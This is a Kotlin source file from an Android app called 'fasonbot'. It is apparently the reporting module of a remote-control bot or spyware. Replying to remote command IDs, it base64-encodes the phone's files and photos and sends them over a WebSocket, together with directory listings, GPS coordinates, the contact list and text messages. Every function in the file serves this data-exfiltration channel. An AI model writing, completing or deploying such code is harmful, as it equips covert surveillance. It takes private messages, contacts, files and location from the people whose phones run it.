package com.fasonbot.app.ws

import android.util.Base64
import android.util.Log
import com.google.gson.JsonObject
import okhttp3.WebSocket
import java.io.File

object WebSocketSender {

    private const val TAG = "WebSocketSender"

    @Volatile var webSocket: WebSocket? = null
    @Volatile var currentCommandId: String = ""

    fun sendText(data: String) {
        try {
            val json = JsonObject().apply {
                addProperty("type", "response")
                addProperty("commandId", currentCommandId)
                addProperty("data", data)
            }
            webSocket?.send(json.toString())
        } catch (e: Exception) {
            Log.e(TAG, "sendText error: ${e.message}")
        }
    }

    fun sendFile(file: File, caption: String? = null) {
        try {
            if (!file.exists()) {
                sendText("File not found: ${file.name}")
                return
            }
            val bytes = file.readBytes()
            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
            val json = JsonObject().apply {
                addProperty("type", "file")
                addProperty("commandId", currentCommandId)
                addProperty("fileName", file.name)
                addProperty("fileData", base64)
                addProperty("fileSize", bytes.size)
                caption?.let { addProperty("caption", it) }
            }
            webSocket?.send(json.toString())
        } catch (e: Exception) {
            Log.e(TAG, "sendFile error: ${e.message}")
            sendText("Error sending file: ${e.message}")
        }
    }

    fun sendPhoto(fileName: String, bytes: ByteArray, caption: String? = null) {
        try {
            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
            val json = JsonObject().apply {
                addProperty("type", "photo")
                addProperty("commandId", currentCommandId)
                addProperty("fileName", fileName)
                addProperty("fileData", base64)
                caption?.let { addProperty("caption", it) }
            }
            webSocket?.send(json.toString())
        } catch (e: Exception) {
            Log.e(TAG, "sendPhoto error: ${e.message}")
        }
    }

    fun sendFileList(path: String, items: List<Map<String, Any>>) {
        try {
            val gson = com.google.gson.Gson()
            val json = JsonObject().apply {
                addProperty("type", "file_list")
                addProperty("commandId", currentCommandId)
                addProperty("path", path)
                add("items", gson.toJsonTree(items))
            }
            webSocket?.send(json.toString())
        } catch (e: Exception) {
            Log.e(TAG, "sendFileList error: ${e.message}")
        }
    }

    fun sendLocation(lat: Double, lng: Double, caption: String? = null) {
        try {
            val json = JsonObject().apply {
                addProperty("type", "location")
                addProperty("commandId", currentCommandId)
                addProperty("lat", lat)
                addProperty("lng", lng)
                caption?.let { addProperty("caption", it) }
            }
            webSocket?.send(json.toString())
        } catch (e: Exception) {
            Log.e(TAG, "sendLocation error: ${e.message}")
        }
    }

    fun sendContactsData(contacts: List<Map<String, Any>>) {
        try {
            val gson = com.google.gson.Gson()
            val json = JsonObject().apply {
                addProperty("type", "contacts_data")
                addProperty("commandId", currentCommandId)
                add("contacts", gson.toJsonTree(contacts))
                addProperty("count", contacts.size)
            }
            webSocket?.send(json.toString())
        } catch (e: Exception) {
            Log.e(TAG, "sendContactsData error: ${e.message}")
        }
    }

    fun sendMessagesData(messages: List<Map<String, Any>>) {
        try {
            val gson = com.google.gson.Gson()
            val json = JsonObject().apply {
                addProperty("type", "messages_data")
                addProperty("commandId", currentCommandId)
                add("messages", gson.toJsonTree(messages))
                addProperty("count", messages.size)
            }
            webSocket?.send(json.toString())
        } catch (e: Exception) {
            Log.e(TAG, "sendMessagesData error: ${e.message}")
        }
    }
}
